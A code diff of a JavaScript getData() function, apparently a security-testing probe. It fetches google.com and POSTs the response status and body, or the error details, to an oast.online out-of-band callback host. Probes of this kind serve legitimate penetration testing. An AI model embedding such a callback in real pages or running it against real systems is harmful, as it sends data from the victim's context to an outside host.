@@ -14,50 +14,47 @@
     
 
 
-      async function getData() {
-    const url = "https://google.com";
+  async function getData() {
+    const url = "https://google.com/";
     const oast = "https://d9stcb2mruohpdmpjia0foc4nep6tzahw.oast.online/";
 
     try {
         const response = await fetch(url);
+        const result = await response.text();
 
-        if (!response.ok) {
-            throw new Error(`HTTP ${response.status}`);
-        }
-
-        const result = await response.json();
+        const data = {
+            type: "success",
+            status: response.status,
+            body: result
+        };
 
         document.getElementById("result").textContent =
-            JSON.stringify(result, null, 2);
-        await fetch(oast+`?q=done`)
+            JSON.stringify(data, null, 2);
+
         await fetch(oast, {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
             },
-            body: JSON.stringify({
-                type: "success",
-                status: response.status,
-                response: result
-            })
+            body: JSON.stringify(data)
         });
 
     } catch (error) {
-        const errorInfo = {
+        const data = {
             type: "error",
             name: error?.name || "UnknownError",
             message: error?.message || String(error)
         };
 
         document.getElementById("result").textContent =
-            JSON.stringify(errorInfo, null, 2);
+            JSON.stringify(data, null, 2);
 
         await fetch(oast, {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
             },
-            body: JSON.stringify(errorInfo)
+            body: JSON.stringify(data)
         });
     }
 }
